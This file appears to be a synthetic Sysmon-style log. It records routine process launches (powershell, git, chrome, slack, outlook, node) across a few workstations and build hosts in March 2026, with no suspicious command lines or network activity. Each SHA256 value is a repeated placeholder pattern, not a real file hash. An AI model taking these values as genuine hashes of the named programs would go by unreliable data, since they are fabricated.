UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-11 17:20:34.903,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000ba3ea4b7cb1ec000ba3ea4b7cb1ec000ba3ea4b7cb1ec000ba3ea4b7cb1ec
2026-03-11 17:32:47.416,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=000997501afe21af000997501afe21af000997501afe21af000997501afe21af
2026-03-11 17:46:43.683,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e66c1adbb5d52001e66c1adbb5d52001e66c1adbb5d52001e66c1adbb5d52
2026-03-11 17:59:08.274,MAC-DEV-04,n.byrd,1,git,"git",explorer.exe,,,SHA256=0022e7fb81613aae0022e7fb81613aae0022e7fb81613aae0022e7fb81613aae
2026-03-11 18:03:22.035,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e86ffeb4592d0001e86ffeb4592d0001e86ffeb4592d0001e86ffeb4592d0
2026-03-11 18:16:03.078,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001106ecf9bed293001106ecf9bed293001106ecf9bed293001106ecf9bed293
2026-03-11 18:23:37.469,BLD-RUN-02,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001c523f1643af1c001c523f1643af1c001c523f1643af1c001c523f1643af1c
2026-03-11 18:34:37.574,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=00168af625ace83b00168af625ace83b00168af625ace83b00168af625ace83b
2026-03-11 18:39:46.002,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00103f91b329043b00103f91b329043b00103f91b329043b00103f91b329043b
2026-03-11 18:52:59.416,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00172d8de3678c4600172d8de3678c4600172d8de3678c4600172d8de3678c46
2026-03-11 18:59:53.934,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009deeaaa5dacaf0009deeaaa5dacaf0009deeaaa5dacaf0009deeaaa5dacaf
2026-03-11 19:09:48.878,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008bfa16b66a9270008bfa16b66a9270008bfa16b66a9270008bfa16b66a927
2026-03-11 19:18:40.519,FIN-WS31,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00105a469a54634000105a469a54634000105a469a54634000105a469a546340
2026-03-11 19:28:58.940,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001c11d842aabebe001c11d842aabebe001c11d842aabebe001c11d842aabebe
2026-03-11 19:33:12.303,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016959ed309ffdb0016959ed309ffdb0016959ed309ffdb0016959ed309ffdb
2026-03-11 19:47:23.093,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000cd8de320f22f0000cd8de320f22f0000cd8de320f22f0000cd8de320f22f0
2026-03-11 19:52:49.521,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e3cb905e5ac6a001e3cb905e5ac6a001e3cb905e5ac6a001e3cb905e5ac6a
2026-03-11 20:06:41.053,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000eb237479dd9e8000eb237479dd9e8000eb237479dd9e8000eb237479dd9e8
2026-03-11 20:17:47.486,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017891a7c47d88a0017891a7c47d88a0017891a7c47d88a0017891a7c47d88a
2026-03-11 20:24:50.528,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=000c9d82f080d3e2000c9d82f080d3e2000c9d82f080d3e2000c9d82f080d3e2
2026-03-11 20:39:45.181,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001914fa7f73f98d001914fa7f73f98d001914fa7f73f98d001914fa7f73f98d
2026-03-11 20:54:35.974,FIN-WS31,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020262b46ffa3aa0020262b46ffa3aa0020262b46ffa3aa0020262b46ffa3aa
2026-03-11 21:05:13.019,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=000c120b94444c30000c120b94444c30000c120b94444c30000c120b94444c30
2026-03-11 21:12:41.654,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001268d86424603b001268d86424603b001268d86424603b001268d86424603b
2026-03-11 21:21:35.691,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=000ce1e9d847a7dd000ce1e9d847a7dd000ce1e9d847a7dd000ce1e9d847a7dd
2026-03-11 21:32:45.063,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001bbbe3ae67ad24001bbbe3ae67ad24001bbbe3ae67ad24001bbbe3ae67ad24
2026-03-11 21:45:57.969,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00116a98b2870f8300116a98b2870f8300116a98b2870f8300116a98b2870f83
2026-03-11 21:58:16.589,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0008b05beaa6a8930008b05beaa6a8930008b05beaa6a8930008b05beaa6a893
2026-03-11 22:07:54.964,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=001b0ac565209a40001b0ac565209a40001b0ac565209a40001b0ac565209a40
2026-03-11 22:14:20.955,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00018044a1260b3c00018044a1260b3c00018044a1260b3c00018044a1260b3c
2026-03-11 22:24:47.485,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000efdd9b7599e6e000efdd9b7599e6e000efdd9b7599e6e000efdd9b7599e6e
2026-03-11 22:28:14.250,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0014963369e7ed7c0014963369e7ed7c0014963369e7ed7c0014963369e7ed7c
2026-03-11 22:40:01.458,FIN-WS31,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001780dbc91e4bdf001780dbc91e4bdf001780dbc91e4bdf001780dbc91e4bdf
2026-03-11 22:47:35.962,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002337bf44adb65c002337bf44adb65c002337bf44adb65c002337bf44adb65c
2026-03-11 22:54:51.696,FIN-WS22,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001fc427fe5b2641001fc427fe5b2641001fc427fe5b2641001fc427fe5b2641
2026-03-11 23:05:57.116,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00170d7cfa78846700170d7cfa78846700170d7cfa78846700170d7cfa788467
2026-03-11 23:17:28.318,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00187f8de055a70100187f8de055a70100187f8de055a70100187f8de055a701
2026-03-11 23:31:02.180,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000560c16d9b3573000560c16d9b3573000560c16d9b3573000560c16d9b3573
2026-03-11 23:36:02.634,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022e2ed0fd0c62c0022e2ed0fd0c62c0022e2ed0fd0c62c0022e2ed0fd0c62c
2026-03-11 23:47:22.527,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a17292f3ee1c8001a17292f3ee1c8001a17292f3ee1c8001a17292f3ee1c8
2026-03-11 23:57:42.002,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000ec0c8ec39d41a000ec0c8ec39d41a000ec0c8ec39d41a000ec0c8ec39d41a
2026-03-12 00:01:01.720,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006a670d1fb78440006a670d1fb78440006a670d1fb78440006a670d1fb7844
2026-03-12 00:14:53.870,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017c81b6288f9ed0017c81b6288f9ed0017c81b6288f9ed0017c81b6288f9ed
2026-03-12 00:18:06.470,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=0000521e86f9fc7b0000521e86f9fc7b0000521e86f9fc7b0000521e86f9fc7b
2026-03-12 00:26:01.599,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0020927c198775220020927c198775220020927c198775220020927c19877522
2026-03-12 00:31:20.526,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002225d7f2a104de002225d7f2a104de002225d7f2a104de002225d7f2a104de
2026-03-12 00:40:12.554,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008c956314442c70008c956314442c70008c956314442c70008c956314442c7
2026-03-12 00:53:40.778,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00071ae93a9a4e6800071ae93a9a4e6800071ae93a9a4e6800071ae93a9a4e68
2026-03-12 01:07:26.015,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012ed9c297901210012ed9c297901210012ed9c297901210012ed9c29790121
2026-03-12 01:17:54.195,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=000436a487ccdc69000436a487ccdc69000436a487ccdc69000436a487ccdc69
2026-03-12 01:28:08.546,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001e0ad9af5262b5001e0ad9af5262b5001e0ad9af5262b5001e0ad9af5262b5
2026-03-12 01:36:19.686,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0018a457ddc1f6650018a457ddc1f6650018a457ddc1f6650018a457ddc1f665
2026-03-12 01:49:51.216,BLD-RUN-02,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ada7b4cd83412001ada7b4cd83412001ada7b4cd83412001ada7b4cd83412
2026-03-12 01:59:09.251,FIN-WS22,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001de513717fbb22001de513717fbb22001de513717fbb22001de513717fbb22
2026-03-12 02:03:20.320,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=00180e792679bdde00180e792679bdde00180e792679bdde00180e792679bdde
2026-03-12 02:08:46.681,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e248afb4abf5a001e248afb4abf5a001e248afb4abf5a001e248afb4abf5a
2026-03-12 02:18:54.719,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=0010c108d509c6e70010c108d509c6e70010c108d509c6e70010c108d509c6e7
2026-03-12 02:23:38.305,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001785a84da097a8001785a84da097a8001785a84da097a8001785a84da097a8
2026-03-12 02:34:32.338,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001d30c36f81b64a001d30c36f81b64a001d30c36f81b64a001d30c36f81b64a
2026-03-12 02:48:47.583,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012e60d89c810a90012e60d89c810a90012e60d89c810a90012e60d89c810a9
2026-03-12 02:58:19.522,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002356f4304ce3ea002356f4304ce3ea002356f4304ce3ea002356f4304ce3ea
2026-03-12 03:09:42.543,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0010f099d21685760010f099d21685760010f099d21685760010f099d2168576
2026-03-12 03:19:33.577,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00164fe7fb0715d400164fe7fb0715d400164fe7fb0715d400164fe7fb0715d4
2026-03-12 03:23:30.793,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000533c10d750bce000533c10d750bce000533c10d750bce000533c10d750bce
2026-03-12 03:28:24.643,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00158dc00d2c0b4600158dc00d2c0b4600158dc00d2c0b4600158dc00d2c0b46
2026-03-12 03:35:29.966,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00055976c6db5eb200055976c6db5eb200055976c6db5eb200055976c6db5eb2
2026-03-12 03:46:41.886,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00023abd6316da6100023abd6316da6100023abd6316da6100023abd6316da61
2026-03-12 03:49:50.643,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00177132692e5b4500177132692e5b4500177132692e5b4500177132692e5b45
2026-03-12 03:53:24.478,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=00136f47e2785be300136f47e2785be300136f47e2785be300136f47e2785be3
2026-03-12 04:02:32.839,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000c89753af1d927000c89753af1d927000c89753af1d927000c89753af1d927
2026-03-12 04:15:53.884,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=0014b367c061f8520014b367c061f8520014b367c061f8520014b367c061f852
2026-03-12 04:26:24.795,FIN-WS22,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e76df3d0376aa000e76df3d0376aa000e76df3d0376aa000e76df3d0376aa
2026-03-12 04:38:34.147,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0017874b7fec74790017874b7fec74790017874b7fec74790017874b7fec7479
2026-03-12 04:45:42.769,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=00125431127bea8f00125431127bea8f00125431127bea8f00125431127bea8f
2026-03-12 04:55:15.062,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000ccea358d0e735000ccea358d0e735000ccea358d0e735000ccea358d0e735
2026-03-12 05:09:51.617,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001813e4d92a6026001813e4d92a6026001813e4d92a6026001813e4d92a6026
2026-03-12 05:16:13.035,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=0005db5b0e6960dd0005db5b0e6960dd0005db5b0e6960dd0005db5b0e6960dd
2026-03-12 05:19:16.865,FIN-WS22,l.chen,1,git,"git",explorer.exe,,,SHA256=0001f67513efa0140001f67513efa0140001f67513efa0140001f67513efa014
2026-03-12 05:24:39.793,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00216c5804030cc200216c5804030cc200216c5804030cc200216c5804030cc2
2026-03-12 05:39:28.479,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=000c9a006ff11f07000c9a006ff11f07000c9a006ff11f07000c9a006ff11f07
2026-03-12 05:50:13.692,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=0007503c375d47a10007503c375d47a10007503c375d47a10007503c375d47a1
2026-03-12 05:54:23.406,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=0008aaedd8cecd170008aaedd8cecd170008aaedd8cecd170008aaedd8cecd17
2026-03-12 06:06:45.934,MAC-DEV-04,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017440fe88c5a040017440fe88c5a040017440fe88c5a040017440fe88c5a04
2026-03-12 06:17:26.902,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004506643607baf0004506643607baf0004506643607baf0004506643607baf
2026-03-12 06:26:38.297,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00079ae1980ecbdb00079ae1980ecbdb00079ae1980ecbdb00079ae1980ecbdb
2026-03-12 06:36:10.454,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d8698e3323532000d8698e3323532000d8698e3323532000d8698e3323532
2026-03-12 06:45:23.693,FIN-WS22,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d3d02a465aed5000d3d02a465aed5000d3d02a465aed5000d3d02a465aed5
2026-03-12 06:59:15.498,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00000aa8004ec0b200000aa8004ec0b200000aa8004ec0b200000aa8004ec0b2
2026-03-12 07:08:19.868,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000747bafc8c5743000747bafc8c5743000747bafc8c5743000747bafc8c5743
2026-03-12 07:18:15.858,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00050d8a90fb157a00050d8a90fb157a00050d8a90fb157a00050d8a90fb157a
2026-03-12 07:28:13.477,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000ee4a00a85d78e000ee4a00a85d78e000ee4a00a85d78e000ee4a00a85d78e
2026-03-12 07:35:56.650,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008b73e6e2b853a0008b73e6e2b853a0008b73e6e2b853a0008b73e6e2b853a
2026-03-12 07:46:00.408,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=001232fe4f19c083001232fe4f19c083001232fe4f19c083001232fe4f19c083
2026-03-12 07:57:32.087,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=00094771865a310900094771865a310900094771865a310900094771865a3109
2026-03-12 08:06:22.384,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001a1d82a36a38fe001a1d82a36a38fe001a1d82a36a38fe001a1d82a36a38fe
2026-03-12 08:17:17.849,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001db2d2aa6ec4ac001db2d2aa6ec4ac001db2d2aa6ec4ac001db2d2aa6ec4ac
2026-03-12 08:31:53.165,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016f3be227101c80016f3be227101c80016f3be227101c80016f3be227101c8
2026-03-12 08:45:14.315,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020ad9bd392c4ba0020ad9bd392c4ba0020ad9bd392c4ba0020ad9bd392c4ba
2026-03-12 08:52:04.032,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00159347be367e9a00159347be367e9a00159347be367e9a00159347be367e9a
2026-03-12 09:00:13.642,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000431dbf14ac78f000431dbf14ac78f000431dbf14ac78f000431dbf14ac78f
2026-03-12 09:04:51.209,MAC-DEV-04,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00082451c8dbf39e00082451c8dbf39e00082451c8dbf39e00082451c8dbf39e
2026-03-12 09:07:55.212,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0011c2d6051306350011c2d6051306350011c2d6051306350011c2d605130635
2026-03-12 09:11:41.425,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00138b361a88def500138b361a88def500138b361a88def500138b361a88def5
2026-03-12 09:17:49.123,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000ba4849f77a1aa000ba4849f77a1aa000ba4849f77a1aa000ba4849f77a1aa
2026-03-12 09:21:59.497,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=0007b19357583ffc0007b19357583ffc0007b19357583ffc0007b19357583ffc
2026-03-12 09:36:44.865,MAC-DEV-17,l.chen,1,node,"node",explorer.exe,,,SHA256=00149c10382f122d00149c10382f122d00149c10382f122d00149c10382f122d
2026-03-12 09:47:47.519,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=0005ccd2e147ca700005ccd2e147ca700005ccd2e147ca700005ccd2e147ca70
2026-03-12 09:55:50.900,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000118017bc3496e000118017bc3496e000118017bc3496e000118017bc3496e
2026-03-12 10:09:42.629,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=001e2e4fb065019d001e2e4fb065019d001e2e4fb065019d001e2e4fb065019d
2026-03-12 10:17:09.285,FIN-WS31,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000b62a9e0646de6000b62a9e0646de6000b62a9e0646de6000b62a9e0646de6
2026-03-12 10:27:53.210,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0001a0835b2c18340001a0835b2c18340001a0835b2c18340001a0835b2c1834
2026-03-12 10:42:46.490,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001a40c577708c96001a40c577708c96001a40c577708c96001a40c577708c96
2026-03-12 10:45:55.472,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0001baa25c50c3900001baa25c50c3900001baa25c50c3900001baa25c50c390
2026-03-12 10:55:55.914,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00163c0babe17ffc00163c0babe17ffc00163c0babe17ffc00163c0babe17ffc
2026-03-12 11:02:07.395,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=000354ef73ab0560000354ef73ab0560000354ef73ab0560000354ef73ab0560
2026-03-12 11:10:28.056,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007bca2ade8660b0007bca2ade8660b0007bca2ade8660b0007bca2ade8660b
2026-03-12 11:14:58.839,BLD-RUN-02,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00070c7d4fd2d51100070c7d4fd2d51100070c7d4fd2d51100070c7d4fd2d511
2026-03-12 11:24:09.586,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0019dbf6fb56a4600019dbf6fb56a4600019dbf6fb56a4600019dbf6fb56a460
2026-03-12 11:36:08.815,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001afed7cf619a7e001afed7cf619a7e001afed7cf619a7e001afed7cf619a7e
2026-03-12 11:42:11.449,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0008fbbc0aa8790c0008fbbc0aa8790c0008fbbc0aa8790c0008fbbc0aa8790c
2026-03-12 11:51:17.422,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=0012b0fdd54c25990012b0fdd54c25990012b0fdd54c25990012b0fdd54c2599
2026-03-12 11:59:37.375,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0002b91815a4bfa50002b91815a4bfa50002b91815a4bfa50002b91815a4bfa5
2026-03-12 12:13:44.369,MAC-DEV-17,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0003a78cbc854b390003a78cbc854b390003a78cbc854b390003a78cbc854b39
2026-03-12 12:19:36.471,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001f9bdf2611b58d001f9bdf2611b58d001f9bdf2611b58d001f9bdf2611b58d
2026-03-12 12:33:52.149,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=0012cd615d2c1d330012cd615d2c1d330012cd615d2c1d330012cd615d2c1d33
2026-03-12 12:37:35.766,FIN-WS31,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00184019005b757c00184019005b757c00184019005b757c00184019005b757c
2026-03-12 12:44:03.571,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001911d30aa2e454001911d30aa2e454001911d30aa2e454001911d30aa2e454
2026-03-12 12:55:49.313,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=000eaa1d0a1969dd000eaa1d0a1969dd000eaa1d0a1969dd000eaa1d0a1969dd
2026-03-12 13:08:14.171,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000572481fbe250f000572481fbe250f000572481fbe250f000572481fbe250f
2026-03-12 13:20:08.589,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000aa0735324667c000aa0735324667c000aa0735324667c000aa0735324667c
2026-03-12 13:28:33.857,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c08defcbd1bd3001c08defcbd1bd3001c08defcbd1bd3001c08defcbd1bd3
2026-03-12 13:40:43.097,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0014954470bb458e0014954470bb458e0014954470bb458e0014954470bb458e
2026-03-12 13:54:22.653,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017f2bbf226d45a0017f2bbf226d45a0017f2bbf226d45a0017f2bbf226d45a
2026-03-12 14:03:19.154,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0003153c600a19250003153c600a19250003153c600a19250003153c600a1925
2026-03-12 14:10:56.409,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000393d29704577d000393d29704577d000393d29704577d000393d29704577d
2026-03-12 14:24:07.456,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=001f0e75adeb1190001f0e75adeb1190001f0e75adeb1190001f0e75adeb1190
2026-03-12 14:29:43.561,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=00114cb5eebdf54f00114cb5eebdf54f00114cb5eebdf54f00114cb5eebdf54f
2026-03-12 14:34:55.014,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00171289d2c7722600171289d2c7722600171289d2c7722600171289d2c77226
2026-03-12 14:49:37.201,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=000e679ce1de7d86000e679ce1de7d86000e679ce1de7d86000e679ce1de7d86
2026-03-12 14:53:33.101,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001c69ea5a18219d001c69ea5a18219d001c69ea5a18219d001c69ea5a18219d
2026-03-12 15:02:21.633,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00091d8ae7f6d68800091d8ae7f6d68800091d8ae7f6d68800091d8ae7f6d688
2026-03-12 15:16:38.814,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014b7aafb64dfdd0014b7aafb64dfdd0014b7aafb64dfdd0014b7aafb64dfdd
2026-03-12 15:28:42.944,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=00175dc512f9e38700175dc512f9e38700175dc512f9e38700175dc512f9e387
2026-03-12 15:38:32.303,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=0010aa50c567c2dc0010aa50c567c2dc0010aa50c567c2dc0010aa50c567c2dc
